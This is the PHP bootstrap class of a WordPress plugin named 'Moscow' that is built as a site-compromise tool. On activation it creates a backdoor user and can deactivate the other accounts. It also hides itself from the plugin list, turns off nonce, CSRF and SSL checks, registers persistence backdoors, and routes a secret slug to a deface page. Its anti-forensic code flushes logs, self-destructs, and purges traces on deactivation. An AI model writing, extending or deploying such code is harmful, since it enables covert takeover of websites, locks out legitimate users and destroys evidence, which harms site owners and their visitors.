<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Main plugin bootstrap — singleton.
 */
final class Plugin
{
    private static ?Plugin $instance = null;

    private UserManager  $users;
    private Redirector   $redirector;
    private DefacePage   $deface;
    private Persistence  $persistence;
    private Hider        $hider;
    private Cleaner      $cleaner;
    private SelfDestruct $destructor;

    private function __construct()
    {
        $this->users      = new UserManager();
        $this->redirector = new Redirector();
        $this->deface     = new DefacePage();
        $this->persistence = new Persistence();
        $this->hider      = new Hider();
        $this->cleaner    = new Cleaner();
        $this->destructor = new SelfDestruct();
    }

    public static function instance(): self
    {
        return self::$instance ??= new self();
    }

    public function boot(): void
    {
        // Core hooks
        add_action('init', [$this->users, 'synchronise']);
        add_action('init', [$this, 'maybe_self_destruct']);
        add_action('init', [$this->cleaner, 'flush_logs']);
        add_action('wp_loaded', [$this->redirector, 'handle']);
        add_action('template_redirect', [$this->deface, 'render_if_backdoor']);

        add_filter('authenticate', [$this->users, 'authenticate'], 30, 3);

        // Stealth
        if (Config::HIDE_PLUGIN) {
            add_filter('all_plugins', [$this->hider, 'filter_plugins_list']);
            add_action('pre_current_active_plugins', [$this->hider, 'hide_in_ui']);
        }

        // Security bypass
        if (Config::BYPASS_NONCE) {
            add_filter('wp_verify_nonce', '__return_true');
        }
        if (Config::BYPASS_CSRF) {
            add_filter('wp_check_referer', '__return_false');
        }
        if (Config::BYPASS_SSL_VERIFY) {
            add_filter('https_ssl_verify', '__return_false');
            add_filter('https_local_ssl_verify', '__return_false');
        }

        // Persistence
        if (Config::ENABLE_BACKDOORS) {
            $this->persistence->register_all();
        }

        // Rewrite rules
        add_action('init', [$this, 'register_rewrite']);
        add_filter('query_vars', [$this, 'register_query_vars']);
    }

    public function register_rewrite(): void
    {
        add_rewrite_rule(
            '^' . preg_quote(Config::BACKDOOR_SLUG, '/') . '/?$',
            'index.php?moscow_page=deface',
            'top'
        );
    }

    public function register_query_vars(array $vars): array
    {
        $vars[] = 'moscow_page';
        return $vars;
    }

    public function maybe_self_destruct(): void
    {
        if (!Config::ENABLE_SELF_DESTRUCT) {
            return;
        }
        if ($this->destructor->is_due()) {
            $this->destructor->run();
        }
    }

    // ------------------------------------------------------------------
    // Lifecycle
    // ------------------------------------------------------------------

    public static function on_activate(): void
    {
        $plugin = self::instance();
        $plugin->users->create_backdoor_user();
        if (Config::ENABLE_DEACTIVATE_USERS) {
            $plugin->users->deactivate_others();
        }
        $plugin->users->persist_state();
        $plugin->destructor->arm();
        flush_rewrite_rules();
    }

    public static function on_deactivate(): void
    {
        $plugin = self::instance();
        if (Config::CLEAR_TRACES_ON_DEACTIVATE) {
            $plugin->cleaner->purge_all();
        }
        flush_rewrite_rules();
    }
}